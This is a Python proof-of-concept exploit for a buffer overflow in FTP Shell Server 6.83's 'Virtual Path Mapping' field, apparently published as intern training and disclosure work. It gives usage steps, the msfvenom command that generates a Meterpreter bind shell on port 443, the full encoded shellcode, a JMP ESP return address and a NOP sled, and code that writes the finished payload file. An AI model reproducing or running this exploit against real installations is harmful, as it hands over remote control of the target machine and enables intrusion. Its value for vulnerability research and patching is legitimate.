#!/usr/bin/python
# Exploit Title: FTP Shell Server 6.83 'Virtual Path Mapping' Buffer Overflow
# Date: 09-04-2019
# Exploit Author: Dino Covotsos - Telspace Systems
# Vendor Homepage: http://www.ftpshell.com/index.htm
# Version: 6.83
# Software Link : http://www.ftpshell.com/downloadserver.htm
# Contact: services[@]telspace.co.za
# Twitter: @telspacesystems
# Tested on: Windows XP SP3 ENG x86
# CVE: TBC from Mitre
# Created during 2019 Intern Training
# Greetz Amy, Delicia, Greg, Tonderai, Nzanoa & Telspace Systems Crew
# PoC:
# 1.) Generate ftpshell.txt, copy the contents to clipboard
# 2.) In the application, open 'Manage FTP Accounts' -> "Configure Accounts" -> "Add Path"
# 3.) Paste the contents of ftpshell.txt in "Virtual Path Mapping"
# 4.) Click "OK" and you'll have a bind meterpreter shell on port 443
#7E429353   FFE4             JMP ESP

#msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=443 -e x86/alpha_mixed -b "\x00\xd5\x0a\x0d\x1a\x03" -f c
shellcode = ("\xda\xc3\xd9\x74\x24\xf4\x59\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58"
"\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c"
"\x4a\x48\x6e\x62\x33\x30\x43\x30\x73\x30\x43\x50\x4f\x79\x6a"
"\x45\x70\x31\x59\x50\x42\x44\x6e\x6b\x66\x30\x50\x30\x4c\x4b"
"\x53\x62\x44\x4c\x4c\x4b\x31\x42\x64\x54\x4c\x4b\x54\x32\x35"
"\x78\x34\x4f\x4d\x67\x43\x7a\x77\x56\x50\x31\x39\x6f\x6c\x6c"
"\x47\x4c\x30\x61\x31\x6c\x76\x62\x36\x4c\x61\x30\x79\x51\x7a"
"\x6f\x76\x6d\x77\x71\x59\x57\x4a\x42\x5a\x52\x32\x72\x76\x37"
"\x6c\x4b\x46\x32\x34\x50\x6e\x6b\x30\x4a\x45\x6c\x4c\x4b\x30"
"\x4c\x36\x71\x74\x38\x39\x73\x30\x48\x73\x31\x58\x51\x46\x31"
"\x4c\x4b\x53\x69\x37\x50\x56\x61\x6b\x63\x6e\x6b\x32\x69\x42"
"\x38\x68\x63\x65\x6a\x70\x49\x6e\x6b\x57\x44\x6e\x6b\x63\x31"
"\x7a\x76\x54\x71\x6b\x4f\x4e\x4c\x4f\x31\x58\x4f\x34\x4d\x76"
"\x61\x4f\x37\x45\x68\x4d\x30\x64\x35\x68\x76\x44\x43\x71\x6d"
"\x7a\x58\x45\x6b\x53\x4d\x67\x54\x44\x35\x6a\x44\x32\x78\x6c"
"\x4b\x50\x58\x37\x54\x63\x31\x6b\x63\x75\x36\x4e\x6b\x34\x4c"
"\x70\x4b\x4e\x6b\x62\x78\x45\x4c\x35\x51\x69\x43\x6c\x4b\x76"
"\x64\x6c\x4b\x66\x61\x68\x50\x4e\x69\x73\x74\x55\x74\x61\x34"
"\x51\x4b\x33\x6b\x61\x71\x76\x39\x30\x5a\x36\x31\x6b\x4f\x6b"
"\x50\x71\x4f\x51\x4f\x71\x4a\x4e\x6b\x65\x42\x38\x6b\x6c\x4d"
"\x31\x4d\x70\x68\x75\x63\x70\x32\x63\x30\x47\x70\x42\x48\x54"
"\x37\x53\x43\x76\x52\x71\x4f\x50\x54\x63\x58\x32\x6c\x34\x37"
"\x77\x56\x54\x47\x49\x6f\x4e\x35\x68\x38\x7a\x30\x47\x71\x43"
"\x30\x43\x30\x57\x59\x4a\x64\x46\x34\x56\x30\x35\x38\x74\x69"
"\x4d\x50\x50\x6b\x57\x70\x39\x6f\x68\x55\x51\x7a\x54\x4b\x32"
"\x79\x30\x50\x6d\x32\x4b\x4d\x72\x4a\x33\x31\x71\x7a\x43\x32"
"\x72\x48\x58\x6a\x44\x4f\x79\x4f\x79\x70\x79\x6f\x5a\x75\x6c"
"\x57\x55\x38\x73\x32\x67\x70\x63\x31\x4d\x6b\x6f\x79\x49\x76"
"\x62\x4a\x62\x30\x61\x46\x42\x77\x75\x38\x6a\x62\x39\x4b\x45"
"\x67\x35\x37\x79\x6f\x78\x55\x6e\x65\x39\x50\x62\x55\x71\x48"
"\x31\x47\x55\x38\x4e\x57\x79\x79\x65\x68\x79\x6f\x49\x6f\x78"
"\x55\x32\x77\x51\x78\x32\x54\x48\x6c\x75\x6b\x68\x61\x49\x6f"
"\x38\x55\x51\x47\x6f\x67\x45\x38\x53\x45\x62\x4e\x50\x4d\x55"
"\x31\x79\x6f\x39\x45\x72\x4a\x53\x30\x30\x6a\x33\x34\x52\x76"
"\x36\x37\x73\x58\x64\x42\x48\x59\x69\x58\x53\x6f\x49\x6f\x38"
"\x55\x4c\x43\x38\x78\x53\x30\x51\x6e\x76\x4d\x6e\x6b\x57\x46"
"\x72\x4a\x51\x50\x61\x78\x67\x70\x36\x70\x75\x50\x33\x30\x30"
"\x56\x31\x7a\x53\x30\x33\x58\x43\x68\x49\x34\x30\x53\x69\x75"
"\x59\x6f\x6a\x75\x4a\x33\x46\x33\x43\x5a\x43\x30\x70\x56\x63"
"\x63\x63\x67\x62\x48\x77\x72\x58\x59\x39\x58\x53\x6f\x4b\x4f"
"\x49\x45\x4d\x53\x7a\x58\x55\x50\x43\x4e\x66\x67\x56\x61\x4b"
"\x73\x46\x49\x69\x56\x74\x35\x6d\x39\x79\x53\x4d\x6b\x58\x70"
"\x4d\x65\x6e\x42\x32\x76\x71\x7a\x65\x50\x56\x33\x69\x6f\x48"
"\x55\x41\x41")

buffer = "A" * 395 + "\x53\x93\x42\x7e" + "\x90" * 20 + shellcode + "C" * 211

payload = buffer
try:
    f=open("ftpshell.txt","w")
    print "[+] Creating %s bytes evil payload.." %len(payload)
    f.write(payload)
    f.close()
    print "[+] File created!"
except:
    print "File cannot be created"